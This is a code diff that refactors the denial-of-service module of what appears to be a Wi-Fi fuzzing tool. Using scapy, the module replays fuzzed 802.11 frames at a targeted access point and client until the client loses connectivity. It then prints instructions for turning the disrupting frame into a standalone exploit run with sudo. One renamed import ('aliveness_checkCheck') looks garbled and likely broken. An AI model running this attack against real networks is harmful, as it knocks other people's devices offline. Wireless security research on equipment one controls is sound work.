@@ -1,37 +1,37 @@
 """Mage"""
 import os
-import sys
 import subprocess
-from time import sleep
+import sys
+import time
 
 import scapy.all
+from Connection_monitors.aliveness_checkCheck import AllvCheck
+from Connection_monitors.DeauthMonitor import DeauthMon
 
 import settings
 from ascii_art import dos_attack
-from Connection_monitors.AlivenessCheck import AllvCheck
-from Connection_monitors.DeauthMonitor import DeauthMon
-from fuzzer_init import att_interface, targeted_AP, targeted_STA
-from Msgs_colors import bcolors
+from fuzzer_init import att_interface, targeted_access_point, targeted_sta
+from message_colors import bcolors
 
 
 def nec_checks():
-    Aliveness = AllvCheck(targeted_STA, "attacking")
-    Aliveness.start()
-    Deauth_monitor = DeauthMon(targeted_AP, targeted_STA, att_interface)
-    Deauth_monitor.start()
+    """nec_checks"""
+    aliveness_check = AllvCheck(targeted_sta, "attacking")
+    aliveness_check.start()
+    deauth_monitor = DeauthMon(targeted_access_point, targeted_sta, att_interface)
+    deauth_monitor.start()
 
 
-def DoS_attack_init(file_list, mode, frames_dir):
+def denial_of_service_attack_init(file_list, mode, frames_dir):
+    """denial_of_service_attack_init"""
     chosen_files_list = []
     frames_list = []
     subprocess.call(["clear"], shell=True)
     print(dos_attack)
-    print(
-        "\n---------------------------------------------------------------------------------------------------------------------\n"
-    )
+    print("\n" + ("-" * 117) + "\n")
     if mode == 1:
         for file in file_list:
-            if "Aliveness" in file:
+            if "aliveness_check" in file:
                 chosen_files_list.append(file)
             elif "Deauth" in file:
                 chosen_files_list.append(file)
@@ -60,6 +60,7 @@ def DoS_attack_init(file_list, mode, frames_dir):
 
 
 def print_exploit(frame, frame_type):
+    """print_exploit"""
     if frame_type == 1:
         print(
             bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC
@@ -80,15 +81,15 @@ def print_exploit(frame, frame_type):
             bcolors.OKBLUE
             + "{DESTINATION_MAC}"
             + bcolors.ENDC
-            + " = targeted_AP/targeted_STA, "
+            + " = targeted_access_point/targeted_sta, "
             + bcolors.OKBLUE
             + "{SOURCE_MAC}"
             + bcolors.ENDC
-            + " = targeted_AP/targeted_STA, "
+            + " = targeted_access_point/targeted_sta, "
             + bcolors.OKBLUE
             + "{AP_MAC}"
             + bcolors.ENDC
-            + " = targeted_AP"
+            + " = targeted_access_point"
         )
         print(
             "\nFinally, replace"
@@ -137,11 +138,11 @@ def print_exploit(frame, frame_type):
             bcolors.OKBLUE
             + "{DESTINATION_MAC}"
             + bcolors.ENDC
-            + " = targeted_AP/targeted_STA, "
+            + " = targeted_access_point/targeted_sta, "
             + bcolors.OKBLUE
             + "{SOURCE_MAC}"
             + bcolors.ENDC
-            + " = targeted_AP/targeted_STA"
+            + " = targeted_access_point/targeted_sta"
         )
         print(
             "\nFinally, replace"
@@ -151,7 +152,8 @@ def print_exploit(frame, frame_type):
             + " with your WNIC attacking interface"
         )
         print(
-            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_ctrl.py{bcolors.ENDC}"
+            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
+            f"sudo python3 exploit_ctrl.py{bcolors.ENDC}"
         )
         print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
         input(
@@ -200,9 +202,9 @@ def print_exploit(frame, frame_type):
         print(
             f"{bcolors.OKBLUE}"
             "{DESTINATION_MAC}"
-            f"{bcolors.ENDC} = targeted_AP/targeted_STA, {bcolors.OKBLUE}"
+            f"{bcolors.ENDC} = targeted_access_point/targeted_sta, {bcolors.OKBLUE}"
             "{SOURCE_MAC}"
-            f"{bcolors.ENDC} = targeted_AP/targeted_STA"
+            f"{bcolors.ENDC} = targeted_access_point/targeted_sta"
         )
         print(
             f"\nFinally, replace{bcolors.OKBLUE}"
@@ -221,6 +223,7 @@ def print_exploit(frame, frame_type):
 
 
 def send_frames(frames_list, mode, frame_type):
+    """send_frames"""
     counter = 0
     if mode == 1:
         try:
@@ -237,13 +240,13 @@ def send_frames(frames_list, mode, frame_type):
                 scapy.all.sendp(frame, count=16, iface=att_interface, verbose=0)
                 if not settings.is_alive:
                     print_exploit(frame, frame_type)
-                    sleep(10)
+                    time.sleep(10)
                     settings.is_alive = True
                     settings.conn_loss = False
                     break
                 elif settings.conn_loss:
                     print_exploit(frame, frame_type)
-                    sleep(10)
+                    time.sleep(10)
                     settings.is_alive = True
                     settings.conn_loss = False
                     break
@@ -276,9 +279,7 @@ print(
     "\t\tNamely, the frames that caused any kind of problematic behavior during the fuzzing are being\n"
     "\t\ttransmitted in a way decided by the below options.\n\n"
 )
-print(
-    "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n"
-)
+print(("- " * 62) + "\n\n")
 print("1) Frames detected at the moment of STA connectivity disruption, one-by-one")
 print(
     "2) Sequence of frames till the moment a disruption was detected "
@@ -318,9 +319,9 @@ else:
     print(f"{bcolors.FAIL}\nNo such choice :({bcolors.ENDC}")
     sys.exit(0)
 
-init_att = DoS_attack_init(file_list, choice, frames_dir)
+init_att = denial_of_service_attack_init(file_list, choice, frames_dir)
 nec_checks()
-sleep(20)
+time.sleep(20)
 
 subprocess.call(["clear"], shell=True)
 send_frames(init_att, choice, choice1)
